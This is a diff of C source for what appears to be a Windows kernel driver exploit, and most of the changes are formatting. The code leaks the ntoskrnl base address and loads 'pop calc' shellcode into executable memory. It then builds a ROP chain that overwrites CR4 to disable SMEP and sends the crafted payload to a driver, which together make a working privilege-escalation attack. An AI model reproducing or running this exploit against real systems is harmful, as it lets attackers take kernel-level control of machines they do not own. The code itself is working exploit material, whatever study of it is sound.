@@ -16,15 +16,15 @@ The payload is work in progress.
 // Get base of ntoskrnl.exe
 LPVOID GetNTOsBase()
 {
-	LPVOID Bases[0x1000];
-	DWORD needed = 0;
-	LPVOID krnlbase = NULL;
-	if (EnumDeviceDrivers(Bases, sizeof(Bases), &needed)) {
-		krnlbase = Bases[0];
-	}
-	return krnlbase;
+    LPVOID Bases[0x1000];
+    DWORD needed = 0;
+    LPVOID krnlbase = NULL;
+    if (EnumDeviceDrivers(Bases, sizeof(Bases), &needed))
+    {
+        krnlbase = Bases[0];
+    }
+    return krnlbase;
 }
-
 
 int main()
 {
@@ -64,14 +64,14 @@ int main()
     //Pop calc.exe shellcode without null-bytes (from: https://www.arsouyes.org/en/blog/2020/01_Shellcode_Windows)
     char shellcode[] = {
         0xeb, 0x44, 0x5b, 0x33, 0xd2, 0x88, 0x53, 0x0b,
-        0x53, 0xb8, 0x80, 0x22, 0xbf, 0x74, 0xff, 0xd0,
+        0x53, 0xb8, 0x00, 0x91, 0xbe, 0x77, 0xff, 0xd0,
         0xeb, 0x45, 0x5b, 0x33, 0xd2, 0x88, 0x53, 0x0d,
-        0x53, 0x50, 0xb8, 0xa0, 0x05, 0xbf, 0x74, 0xff,
+        0x53, 0x50, 0xb8, 0x30, 0x59, 0xbe, 0x77, 0xff,
         0xd0, 0xeb, 0x47, 0x5b, 0x33, 0xd2, 0x88, 0x53,
         0x08, 0xeb, 0x4d, 0x59, 0x33, 0xd2, 0x88, 0x51,
         0x04, 0x33, 0xd2, 0x6a, 0x05, 0x52, 0x52, 0x53,
         0x51, 0x52, 0xff, 0xd0, 0x33, 0xd2, 0x52, 0xb8,
-        0x20, 0x4f, 0xbf, 0x74, 0xff, 0xd0, 0xe8, 0xb7,
+        0x80, 0xf3, 0xbe, 0x77, 0xff, 0xd0, 0xe8, 0xb7,
         0xff, 0xff, 0xff, 0x53, 0x68, 0x65, 0x6c, 0x6c,
         0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c, 0x58, 0xe8,
         0xb6, 0xff, 0xff, 0xff, 0x53, 0x68, 0x65, 0x6c,
@@ -89,7 +89,6 @@ int main()
         exit(-1);
     }
 
-
     //Move Shellcode into memory segment from VirtualAlloc()
     RtlMoveMemory(shellcode_ptr, shellcode, sizeof(shellcode));
 
@@ -99,9 +98,10 @@ int main()
 
     //Enumerate device drivers to get kernel address
     //Kernel ('nt' module) base address
-    LPVOID kernelBaseAddr = GetNTOsBase(); 
+    LPVOID kernelBaseAddr = GetNTOsBase();
 
-    if (!kernelBaseAddr) {
+    if (!kernelBaseAddr)
+    {
         printf("Failed to get base address :(\n");
         exit(-1);
     }
@@ -128,7 +128,7 @@ int main()
 
     char padding[8];
 
-    //Add padding 
+    //Add padding
     memset(padding, 'B', sizeof(padding));
 
     int smepValue = 0x000406e9;
@@ -137,11 +137,11 @@ int main()
 
     printf("Starting EIP overwrite address @ 0x%x\n", ropBuf);
 
-    *(INT_PTR*)ropBuf = (INT_PTR)popEax;
-    *(INT_PTR*)(ropBuf + 4 * 1) = (INT_PTR)padding;
-    *(INT_PTR*)(ropBuf + 4 * 3) = (INT_PTR)smepValue;
-    *(INT_PTR*)(ropBuf + 4 * 4) = (INT_PTR)cr4Eax;
-    *(INT_PTR*)(ropBuf + 4 * 5) = (INT_PTR)shellcode_ptr;
+    *(INT_PTR *)ropBuf = (INT_PTR)popEax;
+    *(INT_PTR *)(ropBuf + 4 * 1) = (INT_PTR)padding;
+    *(INT_PTR *)(ropBuf + 4 * 3) = (INT_PTR)smepValue;
+    *(INT_PTR *)(ropBuf + 4 * 4) = (INT_PTR)cr4Eax;
+    *(INT_PTR *)(ropBuf + 4 * 5) = (INT_PTR)shellcode_ptr;
 
     /*
     printf("What memcpy doing?\n");
@@ -161,7 +161,6 @@ int main()
     memcpy(&payload[shellcodeOffset], &shellcode_ptr, 0x4);
     */
 
-
     printf("Payload length: 0x%x\n", sizeof(payload));
     printf("Sending Driver Payload!\n");
 
@@ -172,4 +171,3 @@ int main()
 
     CloseHandle(drivObjHndl);
 }
-
